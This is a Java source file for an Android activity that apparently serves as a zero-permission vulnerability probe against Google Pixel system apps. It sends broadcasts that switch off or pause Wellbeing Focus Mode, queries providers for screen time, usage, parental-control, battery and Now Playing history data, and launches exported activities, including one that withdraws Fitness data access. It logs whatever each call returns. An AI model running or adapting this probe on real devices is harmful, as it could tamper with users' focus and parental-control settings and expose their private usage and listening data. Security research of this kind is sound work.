package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class PixelProbeActivity extends Activity {
    private static final String T = "PIXELPROBE";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== Pixel-Specific Probe ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " pkg=" + getPackageName());

        probeFocusModeBroadcasts();
        probeWellbeingApi();
        probeTurboProviders();
        probeWellbeingActivities();
        probeASIActivities();

        Log.w(T, "=== PROBE COMPLETE ===");
    }

    private void probeFocusModeBroadcasts() {
        Log.w(T, "--- Focus Mode Broadcast Control ---");

        String[] actions = {
            "com.google.android.apps.wellbeing.focusmode.action.TURN_OFF_NOW",
            "com.google.android.apps.wellbeing.focusmode.action.PAUSE",
            "com.google.android.apps.wellbeing.focusmode.action.RESUME",
            "com.google.android.apps.wellbeing.focusmode.action.SNOOZE",
            "com.google.android.apps.wellbeing.focusmode.action.EXTEND_SINGLE_APP_UNLOCK",
        };

        for (String action : actions) {
            try {
                Intent i = new Intent(action);
                i.setComponent(new ComponentName("com.google.android.apps.wellbeing",
                    "com.google.android.apps.wellbeing.focusmode.manager.impl.FocusModeNotificationActionBroadcast_Receiver"));
                sendBroadcast(i);
                Log.w(T, "[+] SENT: " + action.substring(action.lastIndexOf('.') + 1));
            } catch (SecurityException se) {
                Log.w(T, "[-] BLOCKED: " + action.substring(action.lastIndexOf('.') + 1) + " — " + se.getMessage());
            } catch (Exception e) {
                Log.w(T, "[-] ERROR: " + action.substring(action.lastIndexOf('.') + 1) + " — " + e.getClass().getSimpleName());
            }
        }

        String[] otherBroadcasts = {
            "com.google.android.apps.wellbeing.smartwrap.action.OPT_OUT",
            "com.google.android.apps.wellbeing.winddown.discovery.NOTIFICATION_DISMISSED",
            "com.google.android.apps.wellbeing.autodnd.NOTIFICATION_OPEN",
            "com.google.android.apps.wellbeing.appconfig.limit.action.APP_USAGE_LIMIT_OBSERVER_TRIGGERED",
        };

        String[] otherReceivers = {
            "com.google.android.apps.wellbeing.smartwrap.SmartWrapOptOutReceiver_Receiver",
            "com.google.android.apps.wellbeing.winddown.discovery.NotificationDismissedReceiver_Receiver",
            "com.google.android.apps.wellbeing.autodnd.ui.AutoDndNotificationEntryActivity",
            "com.google.android.apps.wellbeing.appconfig.limit.impl.AppUsageLimitObserverBroadcastReceiver_Receiver",
        };

        for (int i = 0; i < otherBroadcasts.length; i++) {
            try {
                Intent intent = new Intent(otherBroadcasts[i]);
                intent.setComponent(new ComponentName("com.google.android.apps.wellbeing", otherReceivers[i]));
                sendBroadcast(intent);
                Log.w(T, "[+] SENT other: " + otherBroadcasts[i].substring(otherBroadcasts[i].lastIndexOf('.') + 1));
            } catch (Exception e) {
                Log.w(T, "[-] other: " + e.getClass().getSimpleName());
            }
        }
    }

    private void probeWellbeingApi() {
        Log.w(T, "--- Wellbeing Settings Provider API ---");
        ContentResolver cr = getContentResolver();

        String[] methods = {
            "get_settings", "get_focus_mode_status", "get_screen_time",
            "get_usage_stats", "get_app_timers", "get_bedtime_settings",
            "get_wind_down_settings", "get_parental_controls",
            "get_supervision_status", "get_app_limits",
        };

        for (String method : methods) {
            try {
                Bundle extras = new Bundle();
                extras.putString("calling_package", getPackageName());
                extras.putInt("user_id", 0);

                Bundle result = cr.call(Uri.parse("content://com.google.android.apps.wellbeing.api"),
                    method, null, extras);
                if (result != null) {
                    Log.w(T, "[+] " + method + ": " + bundleToString(result));
                    if (result.getBoolean("success", false)) {
                        Log.w(T, "[!!!] " + method + " RETURNED SUCCESS");
                    }
                }
            } catch (SecurityException se) {
                Log.w(T, "[-] " + method + " SECURITY: " + se.getMessage());
            } catch (Exception e) {
                Log.w(T, "[-] " + method + ": " + e.getClass().getSimpleName());
            }
        }

        // Try with protobuf-like extras
        try {
            Bundle extras = new Bundle();
            extras.putByteArray("request", new byte[]{8, 1}); // protobuf field 1 = true
            Bundle result = cr.call(Uri.parse("content://com.google.android.apps.wellbeing.api"),
                "get_settings", null, extras);
            if (result != null) {
                Log.w(T, "[+] get_settings(proto): " + bundleToString(result));
            }
        } catch (Exception e) {
            Log.w(T, "[-] proto call: " + e.getClass().getSimpleName());
        }

        // Try Wellbeing slice provider binding
        try {
            Uri sliceUri = Uri.parse("content://com.google.android.apps.wellbeing.slices/focus_mode");
            Cursor c = cr.query(sliceUri, null, null, null, null);
            if (c != null) {
                Log.w(T, "[+] slice focus_mode: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            Log.w(T, "[-] slice: " + e.getClass().getSimpleName());
        }
    }

    private void probeTurboProviders() {
        Log.w(T, "--- Turbo Battery Providers ---");
        ContentResolver cr = getContentResolver();

        String[][] turboUris = {
            {"battery_health", "content://com.google.android.apps.turbo.battery_health_provider"},
            {"battery_health_ext", "content://com.google.android.apps.turbo.battery_health_ext_provider"},
            {"thermal", "content://com.google.android.apps.turbo.adaptiveplatform.thermal"},
            {"estimated_time", "content://com.google.android.apps.turbo.estimated_time_remaining"},
        };

        for (String[] u : turboUris) {
            // Try query
            try {
                Cursor c = cr.query(Uri.parse(u[1]), null, null, null, null);
                if (c != null) {
                    int count = c.getCount();
                    if (count > 0) {
                        Log.w(T, "[!!!] " + u[0] + " QUERY: " + count + " rows");
                        c.moveToFirst();
                        String[] cols = c.getColumnNames();
                        for (String col : cols) {
                            int idx = c.getColumnIndex(col);
                            try {
                                String val = c.getString(idx);
                                if (val != null) Log.w(T, "  " + col + "=" + val);
                            } catch (Exception e2) {}
                        }
                    } else {
                        Log.w(T, "[+] " + u[0] + " accessible, 0 rows");
                    }
                    c.close();
                }
            } catch (SecurityException se) {
                Log.w(T, "[-] " + u[0] + " SECURITY");
            } catch (Exception e) {
                Log.w(T, "[-] " + u[0] + " query: " + e.getClass().getSimpleName() + ": " + shortMsg(e));
            }

            // Try call
            try {
                Bundle result = cr.call(Uri.parse(u[1]), "get", null, null);
                if (result != null && result.size() > 0) {
                    Log.w(T, "[+] " + u[0] + " call(get): " + bundleToString(result));
                }
            } catch (SecurityException se) {
                Log.w(T, "[-] " + u[0] + " call SECURITY");
            } catch (Exception e) {}
        }

        // Also try anomaly detection data
        try {
            Cursor c = cr.query(Uri.parse("content://com.google.android.apps.turbo.anomaly_data_collection"), null, null, null, null);
            if (c != null) {
                Log.w(T, "[!!!] anomaly_data: " + c.getCount() + " rows");
                c.close();
            }
        } catch (SecurityException se) {
            Log.w(T, "[-] anomaly SECURITY");
        } catch (Exception e) {
            Log.w(T, "[-] anomaly: " + e.getClass().getSimpleName());
        }

        // Try ASI history provider
        try {
            Cursor c = cr.query(Uri.parse("content://com.google.android.as.ambientmusic.historyprovider"), null, null, null, null);
            if (c != null) {
                Log.w(T, "[!!!] ASI history: " + c.getCount() + " rows");
                if (c.getCount() > 0) {
                    c.moveToFirst();
                    for (String col : c.getColumnNames()) {
                        try {
                            Log.w(T, "  " + col + "=" + c.getString(c.getColumnIndex(col)));
                        } catch (Exception e2) {}
                    }
                }
                c.close();
            }
        } catch (SecurityException se) {
            Log.w(T, "[-] ASI history SECURITY: " + shortMsg(se));
        } catch (Exception e) {
            Log.w(T, "[-] ASI history: " + e.getClass().getSimpleName());
        }
    }

    private void probeWellbeingActivities() {
        Log.w(T, "--- Wellbeing Activities ---");

        // Test ExternalAccessRequestActivity — can we request/withdraw access?
        try {
            Intent i = new Intent("com.google.android.apps.wellbeing.action.REQUEST_ACCESS");
            i.setComponent(new ComponentName("com.google.android.apps.wellbeing",
                "com.google.android.apps.wellbeing.datamanagement.accessrequest.ExternalAccessRequestActivity"));
            startActivityForResult(i, 300);
            Log.w(T, "[+] ExternalAccessRequest launched");
        } catch (Exception e) {
            Log.w(T, "[-] ExternalAccessRequest: " + e.getClass().getSimpleName() + ": " + shortMsg(e));
        }

        // Test WITHDRAW_ACCESS — could DoS data sharing
        try {
            Intent i = new Intent("com.google.android.apps.wellbeing.action.WITHDRAW_ACCESS");
            i.setComponent(new ComponentName("com.google.android.apps.wellbeing",
                "com.google.android.apps.wellbeing.datamanagement.accessrequest.ExternalAccessRequestActivity"));
            i.putExtra("package_name", "com.google.android.apps.fitness");
            startActivityForResult(i, 301);
            Log.w(T, "[+] WithdrawAccess launched");
        } catch (Exception e) {
            Log.w(T, "[-] WithdrawAccess: " + e.getClass().getSimpleName() + ": " + shortMsg(e));
        }

        // Test REQUEST_BEDTIME_DATA_CONSENT
        try {
            Intent i = new Intent("com.google.android.apps.wellbeing.action.REQUEST_BEDTIME_DATA_CONSENT");
            i.setComponent(new ComponentName("com.google.android.apps.wellbeing",
                "com.google.android.apps.wellbeing.datamanagement.optin.ui.ExportedBedtimeDataOptInActivity"));
            startActivityForResult(i, 302);
            Log.w(T, "[+] BedtimeDataConsent launched");
        } catch (Exception e) {
            Log.w(T, "[-] BedtimeDataConsent: " + e.getClass().getSimpleName() + ": " + shortMsg(e));
        }

        // Test TIME_SPENT_IN_APP — might show usage stats
        try {
            Intent i = new Intent("com.android.settings.action.TIME_SPENT_IN_APP");
            i.setComponent(new ComponentName("com.google.android.apps.wellbeing",
                "com.google.android.apps.wellbeing.appdetails.AppInfoSettingsActivity"));
            i.putExtra("android.intent.extra.PACKAGE_NAME", "com.google.android.gms");
            startActivityForResult(i, 303);
            Log.w(T, "[+] TimeSpentInApp launched");
        } catch (Exception e) {
            Log.w(T, "[-] TimeSpentInApp: " + e.getClass().getSimpleName() + ": " + shortMsg(e));
        }

        // Test REQUEST_AMBIENT_DETECTION — cough/snore consent
        try {
            Intent i = new Intent("com.google.android.apps.wellbeing.action.REQUEST_AMBIENT_DETECTION");
            i.setComponent(new ComponentName("com.google.android.apps.wellbeing",
                "com.google.android.apps.wellbeing.coughandsnore.consent.ui.ConsentGatewayActivity"));
            startActivityForResult(i, 304);
            Log.w(T, "[+] AmbientDetection launched");
        } catch (Exception e) {
            Log.w(T, "[-] AmbientDetection: " + e.getClass().getSimpleName() + ": " + shortMsg(e));
        }
    }

    private void probeASIActivities() {
        Log.w(T, "--- ASI Activities ---");

        // Test BestiesPickerActivity — might return contact data
        try {
            Intent i = new Intent("com.google.android.apps.miphone.aiai.besties.bestiespicker.ACTION_LAUNCH");
            i.setComponent(new ComponentName("com.google.android.as",
                "com.google.android.apps.miphone.aiai.besties.bestiespicker.ui.BestiesPickerActivity"));
            startActivityForResult(i, 310);
            Log.w(T, "[+] BestiesPickerActivity launched");
        } catch (Exception e) {
            Log.w(T, "[-] BestiesPicker: " + e.getClass().getSimpleName() + ": " + shortMsg(e));
        }

        // Test now-playing:// deeplink
        try {
            Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse("now-playing://history"));
            i.setComponent(new ComponentName("com.google.android.as",
                "com.google.intelligence.sense.ambientmusic.history.HistoryActivity"));
            startActivityForResult(i, 311);
            Log.w(T, "[+] NowPlayingHistory launched");
        } catch (Exception e) {
            Log.w(T, "[-] NowPlayingHistory: " + e.getClass().getSimpleName() + ": " + shortMsg(e));
        }

        // Test TranslateBottomSheet
        try {
            Intent i = new Intent("com.google.android.apps.miphone.aiai.common.TRANSLATE_BOTTOM_SHEET");
            i.setComponent(new ComponentName("com.google.android.as",
                "com.google.android.apps.miphone.aiai.common.translate.bottomsheet.TranslateBottomSheetActivity"));
            i.putExtra("text_to_translate", "test");
            startActivityForResult(i, 312);
            Log.w(T, "[+] TranslateBottomSheet launched");
        } catch (Exception e) {
            Log.w(T, "[-] TranslateBottomSheet: " + e.getClass().getSimpleName() + ": " + shortMsg(e));
        }

        // Test Wellbeing android-app:// handler with deep path
        try {
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setData(Uri.parse("android-app://com.google.android.apps.wellbeing/usage_stats"));
            i.setComponent(new ComponentName("com.google.android.apps.wellbeing",
                "com.google.android.apps.wellbeing.appindexing.impl.UrlHandlerActivity"));
            startActivityForResult(i, 313);
            Log.w(T, "[+] WellbeingUrlHandler launched");
        } catch (Exception e) {
            Log.w(T, "[-] WellbeingUrlHandler: " + e.getClass().getSimpleName() + ": " + shortMsg(e));
        }

        // Test ASI FileProviderUtils — album art file provider
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.google.intelligence.sense.ambientmusic.notification.albumart.fileprovider"),
                null, null, null, null);
            if (c != null) {
                Log.w(T, "[!!!] ASI albumart fileprovider: " + c.getCount() + " rows");
                c.close();
            }
        } catch (SecurityException se) {
            Log.w(T, "[-] ASI albumart SECURITY");
        } catch (Exception e) {
            Log.w(T, "[-] ASI albumart: " + e.getClass().getSimpleName());
        }
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        Log.w(T, "[RESULT] req=" + req + " res=" + res);
        if (data != null) {
            Log.w(T, "[!!!] DATA from req=" + req);
            if (data.getData() != null) Log.w(T, "  URI: " + data.getData());
            if (data.getExtras() != null) {
                for (String key : data.getExtras().keySet()) {
                    Object val = data.getExtras().get(key);
                    String valStr = val != null ? val.toString() : "null";
                    Log.w(T, "  " + key + " = " + valStr.substring(0, Math.min(valStr.length(), 300)));
                }
            }
        }
    }

    private String bundleToString(Bundle b) {
        if (b == null) return "null";
        StringBuilder sb = new StringBuilder("{");
        for (String key : b.keySet()) {
            Object val = b.get(key);
            String valStr;
            if (val instanceof byte[]) {
                byte[] arr = (byte[]) val;
                StringBuilder ascii = new StringBuilder();
                for (byte bt : arr) {
                    if (bt >= 32 && bt < 127) ascii.append((char) bt);
                }
                valStr = "bytes[" + arr.length + "]=" + ascii;
            } else {
                valStr = val != null ? val.toString() : "null";
            }
            sb.append(key).append("=").append(valStr.substring(0, Math.min(valStr.length(), 150))).append(", ");
        }
        sb.append("}");
        return sb.toString();
    }

    private String shortMsg(Exception e) {
        String msg = e.getMessage();
        if (msg == null) return "";
        return msg.substring(0, Math.min(msg.length(), 120));
    }
}
